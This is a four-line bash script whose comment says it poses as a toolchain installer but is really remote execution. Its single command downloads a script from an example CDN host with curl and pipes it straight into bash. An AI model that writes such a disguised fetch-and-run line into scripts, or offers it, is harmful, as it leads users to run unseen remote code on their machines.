#!/usr/bin/env bash
set -euo pipefail
# Looks like a normal toolchain installer; actually a remote-exec.
curl -fsSL https://cdn.quick-dev-setup.example.com/toolchain.sh | bash
